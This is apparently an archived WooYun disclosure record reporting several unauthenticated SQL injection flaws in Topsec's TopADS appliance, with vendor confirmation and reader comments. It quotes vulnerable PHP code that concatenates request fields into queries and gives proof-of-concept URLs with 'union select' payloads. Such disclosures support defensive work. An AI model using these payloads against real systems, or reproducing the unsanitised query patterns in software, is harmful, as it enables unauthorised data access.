{"id": 87272, "wybug_id": "wooyun-2016-0179753", "wybug_title": "天融信TopADS系统数多处SQL注入漏洞（无需登录）", "wybug_corp": "天融信", "wybug_author": "老虎皮", "wybug_date": "2016-03-01 11:43", "wybug_open_date": "2016-05-30 14:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-04：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-30：\t细节向公众公开  简要描述： 厂商不给20分，我就一直挖下去，来个专辑 详细说明：  接上一枚漏洞：http://**.**.**.**/bugs/wooyun-2016-0178904\n\n入口文件：Ngtos.class.php\npublic function run() {        $module = trim($_REQUEST['module']) ? trim($_REQUEST['module']) : 'login';        $action = trim($_REQUEST['action']) ? trim($_REQUEST['action']) : '';        if ($module == 'home' || $module == 'main' || $module == 'login' || $module == 'logout' || $module == 'password') {            $action = $module;            $module = 'page_frame';        }        if ($offset = @strpos($module, '_')) {            $folder = substr($module, 0, $offset);            $file = substr($module, $offset + 1);            $filename = ROOTPATH . '/modules/' . $folder . '/' . $file . '.mds.php';            if (!file_exists($filename)) {                $filename = ROOTPATH . '/modules/' . $folder . '/' . $file . '.php';            }        } else {            $filename = ROOTPATH . '/modules/' . $module . '.mds.php';            if (!file_exists($filename)) {                $filename = ROOTPATH . '/modules/' . $module . '.php';            }        }        if (!file_exists($filename)) {            die('Not Found');        }        require_once $filename;    }\n在ads/policy.mds.php中\nswitch ($_GET['sub_act']) {            case 'show':                $sql = \"select templet_name from standard_templet where templet_name != '\".urldecode($_GET['t_name']).\"'\";                $data = $db->select($sql);                $array_data = array(\"group\" => $data);                $json_data = json_encode($array_data);                echo $json_data;                break;            case 'import':                $param_copy['name'] = urldecode($_GET['tmp_name']);                $param_copy['copy-from'] = urldecode($_GET['src']);                $rspString = getResponse($module_name, \"add\", $param_copy, 2);                if (is_string($rspString)) {                    $retError = showError($rspString);                    echo $retError;                    exit();                }                break;\n这里的$_GET['t_name'] 参数经过解码进入SQL所以我们这里可以直接带入单引号（url编码）然后解码就是单引号了所以我们**.**.**.**/index.php?module=ads_policy&action=database&sub_act=show&t_name=1  其中t_name为参数我们演示如下：**.**.**.**/index.php?module=ads_policy&action=database&sub_act=show&t_name=111%27+union+select+user%28%29--+a\n\n**.**.**.**/index.php?module=ads_policy&action=database&sub_act=show&t_name=111%27+union+select+@@datadir--+a\n\n在第二处 ads/ads_policy_template.mds.php\n<?php$module_name = 'ddos template';$action = $_GET['action'];$param = [];switch ($action) {    case 'show_database_policy_template':        $db = ads_database('TopADS');        $sql = \"select * from standard_templet\";\t    $data = $db->select($sql);\t    $total_num = count($data);        if (!isSet($_POST['page'])) {            $array_data = array(\"group\" => $data);\t        $json_data = json_encode($array_data);\t        echo $json_data;\t        return;        }\t    $start = ($_POST['page']-1)*$_POST['group'];\t    $sql = \"select * from standard_templet order by id asc limit \".$start.\", \".$_POST['group'];\t    $data = $db->select($sql);\t    $cur_num = count($data);\t    if ($data == NULL) {\t\t    echo '{\"group\":[], \"page\":{\"page\":\"1\",\"count\":\"0\",\"total\":\"0\"}}';\t    } else {            if ($total_num == null) {                $total_num = 0;            }\t\t    $pagenation = array(\"page\" => $_POST[\"page\"], \"count\" => $cur_num, \"total\" => $total_num);\t\t    $array_data = array(\"group\" => $data, \"page\" => $pagenation);\t\t    $json_data = json_encode($array_data);\t\t    echo $json_data;\t    }        break;    default:        # code...        break;\n\n$sql = \"select * from standard_templet order by id asc limit \".$start.\", \".$_POST['group'];\nlimit注入第三处：ads/ads_menace_monitor_sql.php\nif ($post_submit_action != NULL) {\t\t$db = ads_database();\t\t$action = explode(\"_\", $post_submit_action);\t\tif ($action[1] == \"showatklog\") {\t\t\t$sql_where = make_where($_POST);\t\t\t$sql = \"SELECT * FROM atk_log WHERE $sql_where AND atk_state = 'begin' ORDER BY \".$_POST[\"sort\"].\" \".$_POST[\"order\"].\" LIMIT \".(($_POST[\"page\"]-1)*$_POST[\"group\"]).\",\".$_POST[\"group\"];\t\t\t$sql_count = \"SELECT count(*) as count FROM atk_log WHERE $sql_where AND atk_state = 'begin'\";\t\t\t$count = $db->select($sql_count);            if ($count[0]['count'] == null)            {                $count[0]['count'] = 0;            }\n\n$sql = \"SELECT * FROM atk_log WHERE $sql_where AND atk_state = 'begin' ORDER BY \".$_POST[\"sort\"].\" \".$_POST[\"order\"].\" LIMIT \".(($_POST[\"page\"]-1)*$_POST[\"group\"]).\",\".$_POST[\"group\"];\n无过滤，order by 注入ads/ads_db_operate.php\nif ($post_submit_action == \"db_templet_show\"){\t$sql = \"select * from standard_templet\";\t$data = $db->select($sql);\t$total_num = count($data);    if (!isSet($_POST['page']))    {        $array_data = array(\"group\" => $data);\t    $json_data = json_encode($array_data);\t    echo $json_data;\t    return;    }\t$start = ($_POST['page']-1)*$_POST['group'];\t$sql = \"select * from standard_templet order by templet_type asc limit \".$start.\", \".$_POST['group'];\t$data = $db->select($sql);\t$cur_num = count($data);\tif($data == NULL)\t{\t\techo '{\"group\":[], \"page\":{\"page\":\"1\",\"count\":\"0\",\"total\":\"0\"}}';\t}\n我们演示如下：**.**.**.**/index.php?module=ads_policy&action=database&sub_act=show&t_name=111%27+union+select+user%28%29--+a\n\n**.**.**.**/index.php?module=ads_policy&action=database&sub_act=show&t_name=111%27+union+select+@@datadir--+a\n\n   漏洞证明：  我们演示如下：**.**.**.**/index.php?module=ads_policy&action=database&sub_act=show&t_name=111%27+union+select+user%28%29--+a\n\n**.**.**.**/index.php?module=ads_policy&action=database&sub_act=show&t_name=111%27+union+select+@@datadir--+a\n\n   修复方案：     版权声明：转载请注明来源 老虎皮@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-03-01 14:04 厂商回复： 已确认，谢谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-01 11:46 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 爱吃小龙虾。)\t\t \n  20分.....    \n     2016-03-01 13:03 |    \t\tYY-2012 \t\t\t( 核心白帽子 |\t\t\t        Rank:3814 漏洞数:726        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  一分    \n     2016-03-01 13:17 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  6666    \n     2016-03-01 14:11 |    \t\t独臂刀王 \t\t\t( 普通白帽子  |\t\t\t        Rank:393 漏洞数:103        | 提交一个漏洞就可以买个柚子~~好爽~)\t\t \n  这么算，还得挖4个阿    \n     2016-03-01 14:37 |    \t\t天融信(乌云厂商)\t\t \n  @老虎皮，给您发了私信，请查收。    \n     2016-05-30 14:22 |    \t\tDotaer \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        | 多学习，多挖洞！)\t\t \n  @老虎皮，私信里有啥好东西？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}